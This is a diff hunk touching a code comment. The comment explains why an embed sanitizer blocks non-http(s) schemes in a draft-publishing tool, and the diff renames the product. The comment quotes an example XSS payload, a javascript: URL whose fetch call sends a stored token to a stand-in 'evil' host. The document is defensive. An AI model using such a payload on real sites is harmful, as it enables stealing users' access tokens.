@@ -2,8 +2,8 @@
 //
 // Why this matters: the Telegram bot commits whatever an allowlisted user sends
 // as a draft, raw HTML included. A crafted draft like
-//   <div data-embed data-src="javascript:fetch('//evil/?t='+localStorage['studio:token'])">
-// would, when opened in Studio, render <iframe src="javascript:…"> that executes
+//   <div data-embed data-src="javascript:fetch('//evil/?t='+localStorage['lanza:token'])">
+// would, when opened in Lanza, render <iframe src="javascript:…"> that executes
 // in the admin origin and exfiltrates the GitHub token. Blocking non-http(s)
 // schemes here closes that, and keeps junk schemes out of the committed/public HTML.
 
